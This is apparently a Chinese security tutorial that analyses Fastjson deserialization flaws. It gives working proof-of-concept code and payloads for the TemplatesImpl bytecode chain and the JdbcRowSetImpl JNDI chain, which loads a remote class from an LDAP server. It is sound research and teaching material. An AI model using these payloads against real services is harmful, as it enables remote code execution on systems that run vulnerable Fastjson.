## 简介

FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象分别通过`toJSONString`和`parseObject/parse`来实现序列化和反序列化。

### 使用

对于序列化的方法`toJSONString()`有多个重载形式。

![image-20220322194044636.png](https://image.3001.net/images/20221207/1670418604_639090ac6902826611d9f.png!small)

  1. `SerializeFeature`: 通过设置多个特性到`FastjsonConfig`中全局使用, 也可以在使用具体方法中指定特性
  2. `SerializeFilter`: 一个接口, 通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化
  3. `SerializeConfig`: 添加特点类型自定义的序列化配置

对于反序列化的方法`parseObject()`也同样有多个重载形式。

![image-20220322194624870.png](https://image.3001.net/images/20221207/1670418615_639090b75ff6e17434442.png!small)

###### 序列化操作

![image-20220322201741481.png](https://image.3001.net/images/20221207/1670418625_639090c18388e03e63399.png!small)

可以发现这两个的区别，如果使用了toJSONString()的属性值`SerializerFeature.WriteClassName`，就会在序列化的时候多写入一个`@type`后面跟着的是反序列化的类名。

###### 反序列化操作

    
    
    package pers.fastjson;
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    
    public class UnSerialTest {
        public static void main(String[] args) {
            String jsonStringWithType = "{\"@type\":\"pers.fastjson.Student\",\"name\":\"RoboTerh\"}";
            String jsonStringWithoutType = "{\"name\":\"RoboTerh\"}";
    
            System.out.println("use JSON.parse with type......");
            Object o1 = JSON.parse(jsonStringWithType);
            System.out.println(o1);
            System.out.println("------------------------------------");
    
            System.out.println("use JSON.parse without type....");
            Object o2 = JSON.parse(jsonStringWithoutType);
            System.out.println(o2);
            System.out.println("-------------------------------------");
    
            System.out.println("use JSON.parseObject with type.......");
            JSONObject o3 = JSON.parseObject(jsonStringWithType);
            System.out.println(o3);
            System.out.println("--------------------------------------");
    
            System.out.println("use JSON.parseObject without type.........");
            JSONObject o4 = JSON.parseObject(jsonStringWithoutType);
            System.out.println(o4);
            System.out.println("----------------------------------------");
    
            System.out.println("use JSON.parseObject without type but hava .Class");
            Student o5 = JSON.parseObject(jsonStringWithoutType, Student.class);
            System.out.println(o5);
        }
    }
    

![image-20220322223443427.png](https://image.3001.net/images/20221207/1670418635_639090cb3037758d5ac35.png!small)

可以通过结果发现1和5成功反序列化，没成功都是因为没有确定需要反序列化的类。

我们可以发现，在引入了`@type`之后，`JSON.parseObject`调用了`getter/setter`方法，`JSON.parse`调用了`setter`方法。

当然，其他的方式也是可以调用`getter`方法的，但是有条件限制：

    
    
    条件一、方法名需要长于4
    
    条件二、不是静态方法
    
    条件三、以get字符串开头，且第四个字符需要是大写字母
    
    条件四、方法不能有参数传入
    
    条件五、继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong
    
    条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）
    

因为`fastjson`存在`autoType`机制, 当用户指定`@type`时, 存在调用恶意`setter`/`getter`的情况,
这就是`fastjson`反序列化漏洞。

##### 简单的漏洞

    
    
    //Evil.java
    package pers.fastjson;
    
    import java.io.IOException;
    
    public class Evil {
        private String name;
    
        public Evil () {
            System.out.println("构造方法");
        }
        public void setName(String name) throws IOException {
            this.name = name;
            System.out.println("调用了setName方法");
            Runtime.getRuntime().exec("calc");
        }
        public String getName() {
            System.out.println("调用了getName方法");
            return name;
        }
    }
    
    
    
    //EvilTest.java
    package pers.fastjson;
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    
    public class EvilTest {
        public static void main(String[] args) {
            String jsonString = "{\"@type\":\"pers.fastjson.Evil\",\"name\":\"RoboTerh\"}";
            JSONObject o = JSON.parseObject(jsonString);
            System.out.println(o);
        }
    }
    

![image-20220322225627183.png](https://image.3001.net/images/20221207/1670418653_639090ddb24942b03a045.png!small)

成功弹出了计算器，

我们调式分析分析，

在`JSON.parseObject`处下的断点。

![image-20220322230108993.png](https://image.3001.net/images/20221207/1670418664_639090e881a0376885c90.png!small)

首先使用了parse()方法进行反序列化操作。

![image-20220322230643348.png](https://image.3001.net/images/20221207/1670418675_639090f35543dd39881eb.png!small)

在`JSON.parse(String text, int
features)`创建了`DefaultJSONParser`对象。![image-20220322231145384.png](https://image.3001.net/images/20221207/1670418686_639090fe978fb10243b39.png!small)

在成功创建了该对象之后通过判断`ch`是`{ / [`为token赋值，这里是12。

![image-20220322231515371.png](https://image.3001.net/images/20221207/1670418712_63909118cbc75d0c4e3b9.png!small)

在`DefaultJSONParser#parse`方法中通过判断token的值，进入创建了一个`JSONObject`对象。

进`parseObject`方法, 这里会通过`scanSymbol`获取到`@type`指定类,
然后通过`TypeUtils.loadClass`方法加载`Class`.

![image-20220322232601645.png](https://image.3001.net/images/20221207/1670418750_6390913ed2b503315985b.png!small)

![image-20220322232755509.png](https://image.3001.net/images/20221207/1670418767_6390914f938a049f05051.png!small)

先是首先在maping中寻找JDK的内置类，没有找到之后使用ClassLoader寻找，得到`clazz`的之后进行返回

创建了`ObjectDeserializer`并且调用了`getDeserializer`方法。

##### Templateslmpl利用链

如果一个类中的`getter`满足调用条件而且存在可利用点，攻击链就产生了。

在`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类中就存在一个私有变量`_outputProperties`，他的`getter`方法就满足在反序列化的时候的调用条件。

###### 分析利用链，

从漏洞触发点开始`Templateslmpl#getTransletInstance`方法。

![image-20220323162758906.png](https://image.3001.net/images/20221207/1670418281_63908f6900ea3693a0958.png!small)

这里通过调用`_class[_transletIndex]`的`newInstance()`方法进行实例化操作，我们追踪`_class[_transletIndex]`的出处，看看是否可以控制，进行恶意操作。

值得注意的是，我们想要达到漏洞点，在`getTransletInstance()`方法的两个if语句中，我们需要保证他的`_name`这个私有属性不为空，否则就直接返回了null，而不会达到漏洞点。

在第二个语句中就是通过`defineTransletClasses()`方法获得了`_class`和`_transletIndex`的值，进入它。

![image-20220323163657909.png](https://image.3001.net/images/20221207/1670418292_63908f74757f95978d9d8.png!small)

首先判断`_bytecodes`是否为空，这里的`_bytecodes`同样是`Templateslmpl`类的成员变量，可控

如果这里不为空的话，就会执行。

![image-20220323164027384.png](https://image.3001.net/images/20221207/1670418300_63908f7c31267c1f2fe1d.png!small)

而且这里如果`_tfactory`不为空的话，就会导致出现异常，然后返回，不会继续执行程序，我们需要保证它不为null，虽然他也是`Templateslmpl`类的成员变量，但是他没有对应的`setter`，我们可以通过`Feature.SupportNonPublicField`来进行修改。

接着走，在后面有一个for循环，

![image-20220323164517134.png](https://image.3001.net/images/20221207/1670418309_63908f8525dfbc3e39b3c.png!small)

通过`loader.defineClass`修饰之后将`_bytecodes[i]`赋值给`_class[i]`，跟进defineClass方法。

![image-20220323165008310.png](https://image.3001.net/images/20221207/1670418320_63908f908f3a7cee41b26.png!small)

他是`ClassLoader`的`defineClass`的重写，作用是将字节码转化为Class，

转回`defineTransletClasses`，在if判断语句中，如果它是main class的时候我们就为`_transletIndex`赋值。

现在重新回到`getTranslateInstance()`方法，现在这里的`_class[_translateIndex]`就是我们为`_bytecodes`赋值的恶意class，我们这里将他给实例化了，成功利用恶意类，

现在我们可以知道`getTranslateInstance()`是可以执行恶意类的，我们搜索在`Templateslmpl`类中什么调用了这个方法的。

![image-20220323170922951.png](https://image.3001.net/images/20221207/1670418336_63908fa049d68a325e2fd.png!small)

可以发现在`newTransformer()`方法中使用了getTransletInstance()方法。

继续搜索在哪里调用了newTransformer()方法。

![image-20220323171342990.png](https://image.3001.net/images/20221207/1670418348_63908fac45307bc0b3216.png!small)

在`getOutputProperties()`方法调用了他，而且这个方法，在反序列化的时候会被调用，现在，这个利用链就完整了。

    
    
    //利用链
    getOutputProperties()
        newTransformer()
        	getTransletInstance()
        		defineTransletClasses()
        	_class[_transletIndex].newInstance()
    

###### POC

    
    
    package pers.fastjson;
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.CannotCompileException;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.NotFoundException;
    import org.apache.commons.codec.binary.Base64;
    
    import java.io.IOException;
    
    public class Fj24POC {
        public static class RoboTerh {
    
        }
        public static String makeClasses() throws NotFoundException, CannotCompileException, IOException {
    
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(RoboTerh.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "RoboTerh" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            byte[] evilCodes = cc.toBytecode();
    
            return Base64.encodeBase64String(evilCodes);
        }
    
        public static String exploitString() throws NotFoundException, CannotCompileException, IOException {
            String evilCodeBase64 = makeClasses();
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String exploit = "{'RoboTerh':{" +
                    "\"@type\":\"" + NASTY_CLASS + "\"," +
                    "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                    "'_name':'RoboTerh'," +
                    "'_tfactory':{ }," +
                    "'_outputProperties':{ }" +
                    "}}\n";
    
            return exploit;
        }
    
        public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
            String exploit = exploitString();
            System.out.println(exploit);
            //JSON.parse(exploit, Feature.SupportNonPublicField);
            //JSON.parseObject(exploit, Feature.SupportNonPublicField);
            JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField);
        }
    }
    

![image-20220323222835313.png](https://image.3001.net/images/20221207/1670418363_63908fbb818518ca4b1cc.png!small)

    
    
    //payload
    {"RoboTerh":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhSb2JvVGVyaAEADElubmVyQ2xhc3NlcwEAIExwZXJzL2Zhc3Rqc29uL0ZqMjRQT0MkUmib1Rlcmg7AQAKU291cmNlRmlsZQEADEZqMjRQT0MuamF2YQwABAAFBwATAQAecGVycy9mYXN0anNvbi9GajI0UE9DJFJvYmUZXJoAQAQamF2YS9sYW5nL09iamVjdAEAFXBlcnMvZmFzdGpzb24vRmoyNFBPQwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAFlJvY9UZXJoMjY5OTQ4OTExMjAwMDABABhMUmib1RlcmgyNjk5NDg5MTEyMDAwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAPAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk="],'_name':'RoboTerh','_tfactory':{ },'_outputProperties':{ }}}
    

条件限制

需要开启`Feature.SupportNonPublicField`这个特性。

### JdbcRowSetImpl利用链

######  **分析利用链**

`JdbcRowSetImpl`类位于`com.sun.rowset.JdbcRowSetImpl`中，它本身没有实现`Serializeble`接口，但是他是`BaseRowSet`类的子类，该类实现了该接口，所以它可以进行序列化。

链子的核心触发点是`javax.naming.InitialContext#lookup`的参数可控造成的漏洞。

![image-20220331184614068.png](https://image.3001.net/images/20221207/1670418375_63908fc7ee08a8d167dd9.png!small)

在`JdbcRowSetImpl#setAutoCommit`中如果`this.conn`为空的时候，就会调用`this.connect`方法。

![image-20220331185512853.png](https://image.3001.net/images/20221207/1670418389_63908fd56024391a44968.png!small)

然后在connect方法中就会调用`Javax.naming.InitialContext#lookup`方法，参数是`dataSourceName`成员变量。

![image-20220331185544902.png](https://image.3001.net/images/20221207/1670418396_63908fdca205f4ff89814.png!small)

    
    
    //调用链
    JdbcRowSetImpl对象
        getDataSource
        	setAutocommit方法
        		context.lookup(datasourcename)
    

###### POC

    
    
    package pers.fastjson;
    
    import com.alibaba.fastjson.JSON;
    
    public class Fj24_Jdbc_POC {
        public static void main(String[] args) {
            String payload = "{" +
                    "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                    "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                    "\"autoCommit\":\"true\"," +
                    "}";
            //JSON.parseObject(payload); 成功
            //JSON.parse(payload); 成功
            JSON.parseObject(payload, Object.class);
        }
    }
    

![image-20220331183123270.png](https://image.3001.net/images/20221207/1670418418_63908ff2686ed4cf3a79e.png!small)

    
    
    //payload
    {"RoboTerh":{
    	"@type":"com.sun.rowset.JdbcRowSetImpl",
    	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
    	"autoCommit":true
    }}
    

###### 条件限制，

使用了JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，需要在有网的情况下执行。

